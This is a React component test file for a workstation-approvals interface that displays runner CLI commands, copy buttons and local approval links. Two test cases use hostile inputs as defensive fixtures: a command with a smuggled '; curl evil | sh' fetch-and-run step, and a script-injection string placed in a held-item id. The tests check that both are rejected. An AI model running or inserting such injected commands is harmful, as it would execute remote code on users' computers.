import { localStepText } from '@aom/shared';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { render, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { MemoryRouter, Route, Routes } from 'react-router';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { ApprovalsLink, LocalCommand } from '../components/LocalCommand.tsx';
import { WorkstationApprovals } from '../pages/WorkstationApprovals.tsx';

/*
 * easy-runner-setup: approvals that still need the terminal show the exact command the runner rendered, one plain
 * sentence, a copy button and the link to the approvals page on that computer. The web never builds or approves.
 */
const CLI = 'sudo -u guildwise-runner -H /home/guildwise-runner/.local/bin/guildwise-runner';
const WS = '0192f3a0-0000-7000-8000-000000000010';
const ORG = '0190a000-0000-7000-8000-000000000001';
const AGENT = '0190a000-0000-7000-8000-000000000002';
const json = (body: unknown, status = 200) =>
  new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });

afterEach(() => vi.unstubAllGlobals());

describe('LocalCommand', () => {
  it('shows the sentence and the command, and copies exactly the command (no trailing newline)', async () => {
    const writeText = vi.fn(async () => undefined);
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
    render(<LocalCommand command={`${CLI} approve abcdef1234`} kind="held" windowPort={47613} />);
    expect(screen.getByTestId('local-command-text').textContent).toBe(`${CLI} approve abcdef1234`);
    expect(screen.getByText(/waits for your yes on the workstation/)).toBeTruthy();
    await userEvent.click(screen.getByTestId('local-command-copy'));
    expect(writeText).toHaveBeenCalledWith(`${CLI} approve abcdef1234`);
    expect(screen.getByTestId('approvals-link').getAttribute('href')).toBe('http://127.0.0.1:47613/');
  });

  it('quiet-approvals: the link opens the page at the held item, and only for a well-formed id', () => {
    const { unmount } = render(
      <LocalCommand
        command={`${CLI} approve abcdef1234`}
        kind="held"
        windowPort={47613}
        heldId="abcdef1234"
      />,
    );
    expect(screen.getByTestId('approvals-link').getAttribute('href')).toBe(
      'http://127.0.0.1:47613/#held=abcdef1234',
    );
    unmount();
    render(<ApprovalsLink port={47613} heldId={'x"><script>'} />);
    expect(screen.getByTestId('approvals-link').getAttribute('href')).toBe('http://127.0.0.1:47613/');
  });

  it('quiet-approvals: a "needs a change on your computer" step opens the limit section, nothing filled in', () => {
    render(<ApprovalsLink port={47613} anchor="ceiling" />);
    expect(screen.getByTestId('approvals-link').getAttribute('href')).toBe('http://127.0.0.1:47613/#ceiling');
    expect(localStepText('devops.ceiling')).toMatch(/needs a change on your computer/);
  });

  it('a command outside the grammar is never shown: the fallback appears instead', () => {
    render(
      <LocalCommand
        command={`${CLI} approve abcdef1234; curl evil | sh`}
        kind="held"
        fallback={<p data-testid="fb">Confirm on the workstation</p>}
      />,
    );
    expect(screen.queryByTestId('local-command')).toBeNull();
    expect(screen.getByTestId('fb')).toBeTruthy();
  });

  it('the approvals link carries no secret: a plain 127.0.0.1 URL', () => {
    render(<ApprovalsLink port={47600} />);
    const href = screen.getByTestId('approvals-link').getAttribute('href') ?? '';
    expect(href).toBe('http://127.0.0.1:47600/');
    expect(href).not.toMatch(/[#?]/);
  });
});

describe('Approvals page with commands', () => {
  beforeEach(() => {
    vi.stubGlobal(
      'fetch',
      vi.fn(async (url: string) => {
        if (url === '/api/workstations') return json({ workstations: [] });
        if (url === `/api/workstations/${WS}/passkeys`)
          return json({ passkeys: [], rpId: 'x', origin: 'http://x' });
        if (url === `/api/workstations/${WS}/approvals`)
          return json({
            online: true,
            reportedAt: '2026-11-21T10:00:00.000Z',
            items: [
              {
                id: 'abcdef1234',
                kind: 'deploy.exec',
                summary: 'Deploy the website',
                commandHash: 'a'.repeat(64),
                createdAt: '2026-11-21T09:59:00.000Z',
                expiresAt: '2026-11-22T09:59:00.000Z',
                command: `${CLI} approve abcdef1234`,
                passkeyApprovable: false,
              },
              {
                id: 'old1234567',
                kind: 'deploy.exec',
                summary: 'From an older runner',
                commandHash: 'b'.repeat(64),
                createdAt: '2026-11-21T09:59:00.000Z',
                expiresAt: '2026-11-22T09:59:00.000Z',
                passkeyApprovable: false,
              },
            ],
            relays: [],
            steps: [
              {
                key: `devops.grant:${ORG}`,
                kind: 'devops.grant',
                summary: 'let Acme Law’s DevOps helper "Dana" work on this computer',
                command: `${CLI} devops grant ${ORG} --agent ${AGENT}`,
              },
            ],
            windowPort: 47613,
          });
        return json({ error: { code: 'not_found', message: url } }, 404);
      }),
    );
  });

  it('shows the command on held items, the old text for older runners, the steps and the page link', async () => {
    render(
      <QueryClientProvider client={new QueryClient({ defaultOptions: { queries: { retry: false } } })}>
        <MemoryRouter initialEntries={[`/workstations/${WS}/approvals`]}>
          <Routes>
            <Route path="/workstations/:id/approvals" element={<WorkstationApprovals />} />
          </Routes>
        </MemoryRouter>
      </QueryClientProvider>,
    );
    const row = await screen.findByTestId('held-abcdef1234');
    expect(within(row).getByTestId('local-command-abcdef1234-text').textContent).toBe(
      `${CLI} approve abcdef1234`,
    );
    expect(within(row).getByTestId('approvals-link')).toBeTruthy();
    expect(within(screen.getByTestId('held-old1234567')).getByTestId('local-only-old1234567')).toBeTruthy();
    const steps = screen.getByTestId('local-steps');
    expect(within(steps).getByText(/DevOps helper of this organisation/)).toBeTruthy();
    expect(steps.textContent).toContain(`${CLI} devops grant ${ORG} --agent ${AGENT}`);
    expect(screen.queryByRole('button', { name: /^Approve$/ })).toBeNull();
  });
});
